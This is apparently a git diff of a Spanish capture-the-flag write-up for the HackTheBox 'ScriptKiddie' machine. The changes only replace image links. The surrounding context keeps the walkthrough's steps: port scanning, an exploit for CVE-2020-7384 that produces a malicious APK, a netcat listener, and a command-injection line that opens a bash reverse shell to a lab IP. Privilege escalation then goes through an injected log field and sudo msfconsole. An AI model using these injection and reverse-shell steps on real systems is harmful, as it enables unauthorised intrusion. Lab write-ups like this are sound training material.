@@ -2,7 +2,7 @@
 
 **Autor: Christian Jimenez**
 
-![[Pasted image 20210518115903.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/1.png)
 
 ## ESCANEO Y ENUMERACION
 
@@ -14,7 +14,7 @@ nmap -p- --open -T5 - v -n 10.10.10.226 -oG allPorts
 
 La salida nos muesta el puerto 22 y 500 abiertos:
 
-![[Pasted image 20210518114510.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/2.png)
 
 Vamos a realizar una enumeracion de los servicios en los puertos:
 
@@ -22,17 +22,17 @@ Vamos a realizar una enumeracion de los servicios en los puertos:
 nmap -p22,5000 -sV -sC 10.10.10.226 -oN targeted
 ```
 
-![[Pasted image 20210518114629.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/3.png)
 
 Vemos una pagina web en el puerto 5000 y el puerto ssh abierto (para conexiones posteriores me imagino)
 
 Vamos a ver que hay en la pagina web:
 
-![[Pasted image 20210518115934.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/4.png)
 
-![[Pasted image 20210518115958.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/5.png)
 
-![[Pasted image 20210518120008.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/6.png)
 
 Vemos que la pagina ofrece 3 herramientas online:
 
@@ -46,7 +46,7 @@ En elste caso nos vamos a aprovechar del tercer punto ya que si puede cargar un 
 
 Buscando en searchsploit template con esas extenciones encontre uno para android:
 
-![[Pasted image 20210518120452.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/7.png)
 
 Nos lo copiamos a nuestro directorio y vemos que es lo que hace:
 
@@ -57,7 +57,7 @@ nano 49491.py
 
 ```
 
-![[Pasted image 20210518120911.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/8.png)
 
 Vemos que esta registrado como el CVE 2020-7384, leyendo el codigo se puede entender que te genera un .apk malicioso y que en la variable payload se inyecta el comando que quieres ajacutar remotamente.
 
@@ -86,7 +86,7 @@ ya con eso instalado podemos ejecutar el script en python:
 python3 49491.py
 ```
 
-![[Pasted image 20210518121554.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/9.png)
 
 No escró la apk maliciosa en la siguiente ruta: **/tmp/tmpuyfkn0bt/evil.apk**
 
@@ -104,11 +104,11 @@ Y al mismo tiempo nos ponemos a la escucha con netcat en el puerto 4455:
 nc -lvnp 4455
 ```
 
-![[Pasted image 20210518122019.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/10.png)
 
 en el campo de lhost puede ir cualquier direccion IP vsalida por la pagina y damos en generate y en netcat obtendremos acceso a la maquina como el usuario kid:
 
-![[Pasted image 20210518122136.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/11.png)
 
 nos dirigimos a su /home/kid y vemos la primera flag:
 
@@ -118,7 +118,7 @@ ls
 cat user.txt
 ```
 
-![[Pasted image 20210518122500.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/12.png)
 
 ## ESCALA DE PRIVILEGIOS
 
@@ -126,11 +126,11 @@ Para la escalada de priviegios tenemos que ir viendo todos los directorios posib
 
 dentro del directorio /home/kid esta la flag pero vemos que hay acceso a directorio /home/pwn:
 
-![[Pasted image 20210518142420.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/13.png)
 
 Vemos un archivo llamado **scanlosers.sh** que podemos visualizar:
 
-![[Pasted image 20210518142504.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/14.png)
 
 Vemos que carga el contenido de /home/kid/logs/hackers le aplica un filtro y ejecuta un comando.
 
@@ -178,7 +178,7 @@ chmod +x proc.sh
 ./proc.sh
 ```
 
-![[Pasted image 20210518143106.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/15.png)
 
 Vemos que se esta ejecutando el mismo comando del archivo **scanlosers.sh**:
 
@@ -188,7 +188,7 @@ sh -c nmap --top-ports 10 -oN recon/;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.
 
 entonces es una tarea que se ejecuta cada cierto periodo de tiempo. Claro que la relacion con el script:
 
-![[Pasted image 20210518142504.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/16.png)
 
 la variable ${ip} valdria:
 
@@ -282,11 +282,11 @@ sh -c nmap --top-ports 10 -oN recon/127.0.0.1 ;/bin/bash -c 'bash -i >& /dev/tcp
 
 guardamos y tenemos una reverse shell como pwn:
 
-![[Pasted image 20210518150416.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/17.png)
 
 si hacemos un sudo -l vemos que podemos ejecutar msfconsole como sudo:
 
-![[Pasted image 20210518150440.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/18.png)
 
 ejecutamos:
 
@@ -296,8 +296,8 @@ sudo /opt/metasploit-framework-6.0.9/msfconsole
 
 y recordemos que dentro de metasploit podemos ejecutar los comandos de metasploit y tambien comandos del sistema operativo:
 
-![[Pasted image 20210518150624.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/19.png)
 
 Ya podemos leer la flag:
 
-![[Pasted image 20210518150655.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/20.png)
